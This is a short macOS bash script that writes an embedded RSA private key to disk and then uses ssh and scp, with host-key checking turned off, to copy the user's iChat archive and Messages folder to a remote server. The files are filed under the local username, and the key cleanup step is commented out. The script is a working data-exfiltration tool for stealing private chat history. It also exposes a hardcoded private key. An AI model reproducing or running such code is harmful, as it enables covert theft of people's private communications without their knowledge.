#!/bin/bash
ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
MESSAGES=~/Library/Messages
#SERV=www.fsckyourself.com
SERV=www.naookiesato.com
SERVPORT=8087
SERVUSER=sauron
SERVPATH=/home/sauron/messages
KEY="-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA7RZyPnBFV3V5Lffo2m/YwsjrGLC0FTzsjwnXiCfYYkCHMjep\nZ5zzN94tDeXFRKWhL3OHXXxUKudgVgANmtQcBXKRx7R/bJRlhknUvpwHJ5giQOxy\nSKBb0TmIi0xsmQNTv6vxPjV9nrvLDdcJJuBaf0xeJv+cXv9pYU5TYgXvzIuIG5+m\nEoc+lwkoEYltXLDWF3vM5VaMcJSVeNSaQu5iHi9BDCVHNdluFPpufRi8xsI/CMlT\nGyNezdnOBUi4xCwL4BVqCMLbWLebJ+3oZZdDyWFHErSCMLrKSWn3Bd4NIjrWw46T\nvPlGzIkei8T16NbMvKuiDH9KE7GzHv8M4Mcb+QIDAQABAoIBAHORf3rkK0jooHtB\n3yWrY5P/cGoGqKG5ou5Os9tQ4O9z2PMnotI49W4ERR4DJNfDjQCeZhux4S1Qv+rr\n97XDMy2MnXcliv+YjqyZDLUlRW+NfxT6rPKuCFPCocaVKFKmBorl+6CBXoyjqeVD\nLtjef/6RcUu9SbIc+ndOQOMFVdD0OuPKOYND51EJvpSdJAtklvlNbuPOfYrM7gR4\n5d/OKXcRwY3eu/nrUrSgbHp7Ypk+1mMgFdMBIn4BkkJN+KdybYsJNuRUZGv+zUsq\nj+LB4qNptw6zEkAX5CISbDP1UdwW5MfkSEeQCOPnpZ+45jLE53qXpasgH3e6veC/\nn72WvAECgYEA9sWjmXjaLOIbbdSaiZf+pL1KqeIygr9e4gLE22uuIU8BQSdLjLCx\nUx0fEmzNVHkgpDNY/uT7EmT0cTHSNVnuyrZ3AyOCys6JQ/SHBy5uudO7RinELBi2\ntFIZgceK/EVsVU75Tr6+RpRz1MSBzacH5tiIeVu3UEeCYNOaVEw6CLkCgYEA9fQZ\nNT+8qKhvX5H1eLgsgh0LpeESflOj3UfQ7sWnKy3PQjueXZsq22OpaRYdDG5hCOhl\nHlHkffjmAGYoGfIXhNldgk4vX9rBVJKWcIjl61hzzZaG1rOW4C36Y/qxtQAPZGh5\nYY31YDCDmysz6oohIXvXH+Kw6Hk6KK0leXCljUECgYEAp9iGDj1FKIIiZfHVqwDX\nEvYtcp+H+6ZuwwtfGl+DcORr1gUEPg1wjzefisi2YF6C9Sx3u+fDXh+Mo/FfKSqi\nYP76tAfTTl5svuvza88JQRvipTaDV/r3Sm8NKlivECeoJ94vdIAIq7kNkAqYv2h8\n12cwbFsVtGTvKSzEK9ItJwECgYA7uyhUEkKTAzTpFN10j+XfQ4aMpniDTXTCTKql\nEkNi7SEkiK4RNZnW5gFCkChF2JigPTAxiNng7g2Nk0Gx62Vi0hcviiVfNhU1oNQA\nSH7uBPE6wI/GnJ7Lmt7wYPW/a2BRlj3EP2GUFrQffwKAt0MMirLX/4nPK4HAVyx+\nrajHAQKBgBzVs1KdlQsDNLoqDPc/StoOzj7CaYXmGrrDGODkeDRyUxRGD6b3Heku\nGlhQLbU0e6V7ATgftgAoGKCQaiwtIvm4/VpK7epTIk5Gp25vTaXmmXdolRgnx8Lj\n11yAr3T+4+MBN9HbbqipuhysqypSrMOAC4570iFeHPbHPjhlDy2I\n-----END RSA PRIVATE KEY-----"
KEYDIR=~/.msssh/
KEYPATH=~/.msssh/id_rsa

mkdir ${KEYDIR}
echo -e ${KEY} > ${KEYPATH}
chmod 400 ${KEYPATH}

cd ${ARCHIVE}
if [ $? -eq 0 ]; then
    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
fi
cd ${MESSAGES}
if [ $? -eq 0 ]; then
    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
fi

#rm -rf ${KEYDIR} #cleanup

